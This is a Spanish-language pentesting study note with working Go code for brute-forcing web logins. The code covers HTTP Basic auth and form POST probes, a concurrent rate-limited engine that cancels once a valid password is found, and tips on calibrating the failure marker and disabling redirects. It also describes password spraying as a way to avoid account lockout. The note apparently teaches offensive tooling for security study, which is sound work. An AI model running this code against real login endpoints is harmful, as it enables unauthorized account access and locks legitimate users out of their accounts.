---
tags:
  - Go
  - Go/Web
  - Brute-Force
Descripción: "Con usuarios válidos en mano, atacas la contraseña"
Fecha de actualización: 2026-07-26
Nota previa: "[[02 - Enumeración de usuarios]]"
Nota siguiente: 
Area: "[[Enumeración y fuerza bruta web.base|Enumeración y fuerza bruta web]]"
---
---

Con usuarios válidos en mano, atacas la contraseña. Dos vectores clásicos: el **formulario** de login (POST) y la **autenticación HTTP Basic** (cabecera `Authorization`). La teoría (tipos de ataque, wordlists, defensas) vive en Red Team [[02 - Fuerza bruta de contraseñas en el login]] y [[00 - Introducción al brute forcing]]; aquí el motor en Go, con la variante **"parar al primer acierto"** que preparamos en [[00 - Patrón worker pool y rate limiting]].

> [!info]+ Fuente
> Recetas "Brute forcing passwords" y "Brute forcing login through the Authorization header" de *Python Web Penetration Testing Cookbook* (2015).

## HTTP Basic: `SetBasicAuth` hace el trabajo sucio

El original construye la cabecera `Authorization: Basic <base64(user:pass)>` a mano. Go lo hace por ti con `req.SetBasicAuth` — y el hallazgo es simplemente "el servidor dejó de responder `401`":

```go
func basicAuthProbe(client *http.Client, target, user string) Probe {
    return func(ctx context.Context, c Candidate) (Result, error) {
        req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
        if err != nil {
            return Result{}, err
        }
        req.SetBasicAuth(user, string(c))   // base64(user:pass) automático
        resp, err := client.Do(req)
        if err != nil {
            return Result{}, err
        }
        defer resp.Body.Close()
        io.Copy(io.Discard, resp.Body)
        return Result{
            Candidate: c,
            Status:    resp.StatusCode,
            Hit:       resp.StatusCode != http.StatusUnauthorized,   // ya no es 401 → dentro
        }, nil
    }
}
```

## Parar al primer acierto

En content discovery querías **todos** los hallazgos; aquí, en cuanto aciertas, **cortas** el resto (no sigas probando 10.000 contraseñas tras dar con la buena). Devuelves un centinela desde la rama `Hit` para cancelar a los hermanos, y lo distingues de un error real con `errors.Is`:

```go
var errFound = errors.New("credencial válida encontrada")

func BruteForce(ctx context.Context, creds []Candidate, probe Probe, workers int, rps float64) (Result, bool) {
    limiter := rate.NewLimiter(rate.Limit(rps), workers)
    g, ctx := errgroup.WithContext(ctx)
    g.SetLimit(workers)

    var (
        mu    sync.Mutex
        found Result
    )
    for _, c := range creds {
        g.Go(func() error {
            if err := limiter.Wait(ctx); err != nil {
                return err
            }
            res, err := probe(ctx, c)
            if err != nil {
                return nil   // fallo de red: sigue
            }
            if res.Hit {
                mu.Lock()
                found = res
                mu.Unlock()
                return errFound   // cancela el resto del barrido
            }
            return nil
        })
    }
    if errors.Is(g.Wait(), errFound) {
        return found, true
    }
    return Result{}, false
}
```

## Formulario: calibra el "éxito"

El login por form no tiene un `401` limpio. El acierto se detecta por un **cambio de estado**: redirección al dashboard (`302` a `/home`), una cookie de sesión (`Set-Cookie`) o la **desaparición** del mensaje de error. El probe suele mirar el marcador de fallo:

```go
func formProbe(client *http.Client, loginURL, user, failMarker string) Probe {
    return func(ctx context.Context, c Candidate) (Result, error) {
        form := url.Values{"username": {user}, "password": {string(c)}}
        req, err := http.NewRequestWithContext(ctx, http.MethodPost, loginURL,
            strings.NewReader(form.Encode()))
        if err != nil {
            return Result{}, err
        }
        req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        resp, err := client.Do(req)
        if err != nil {
            return Result{}, err
        }
        defer resp.Body.Close()
        body, _ := io.ReadAll(resp.Body)
        // éxito = ya NO aparece el marcador del login fallido
        return Result{
            Candidate: c,
            Status:    resp.StatusCode,
            Hit:       !bytes.Contains(body, []byte(failMarker)),
        }, nil
    }
}
```

<mark style="background: #FFB8EBA6;">El `failMarker` lo calibras con un intento que sabes fallido</mark> ("credenciales inválidas") — mismo principio de baseline que en content discovery. Y configura el cliente para **no** seguir redirecciones, y así ver el `302` de éxito en vez de la página a la que redirige:

```go
client := &http.Client{
    Timeout:       10 * time.Second,
    CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
}
```

## Modernizaciones sobre el recetario

- **`req.SetBasicAuth(user, pass)`** en vez de montar el base64 a mano.
- **Cancelación real al acertar** (`errgroup` + centinela), no seguir barriendo en balde.
- **Concurrente con rate limit**, del motor de la nota [[00 - Patrón worker pool y rate limiting]].
- <mark style="background: #FFB86CA6;">Password spraying en vez de brute force ciego</mark>: probar **muchas** contraseñas contra **un** usuario dispara el bloqueo de cuenta. El enfoque moderno lockout-aware invierte el bucle — **una** contraseña común (`Winter2026!`) contra **todos** los usuarios, esperar el tiempo de reset, siguiente contraseña. Cambias el orden de los bucles sobre el mismo motor.

> [!warning]+ Esto hace ruido y bloquea cuentas
> Un brute force de login es de lo más detectable y dañino: dispara lockouts, alertas y logs. En real: ritmo bajo, spraying antes que brute, y credenciales por defecto / filtradas **primero** (Red Team [[06 - Credenciales por defecto]]). El bypass de Basic auth por otras vías (verb tampering) está en [[02 - Bypass de autenticación básica]].

> [!info]+ Arsenal
> `Hydra`, `ffuf` (con `-mode clusterbomb`), `medusa`, `patator` — con reintentos, proxies y motores por protocolo. Tu herramienta Go entra para lógicas de login raras (CSRF token dinámico por petición, multi-step, anti-CSRF + captcha). Comparativa en Red Team [[03 - Medusa y alternativas modernas]].

---

Cierras el bloque de enumeración y fuerza bruta: un motor concurrente reutilizable aplicado a rutas, usuarios y credenciales. El siguiente paso es inyectar **payloads** para detectar vulnerabilidades, no solo adivinar valores → [[00 - Motor de fuzzing web]] (carpeta [[Escáner de vulnerabilidades web.base|Escáner de vulnerabilidades web]]).
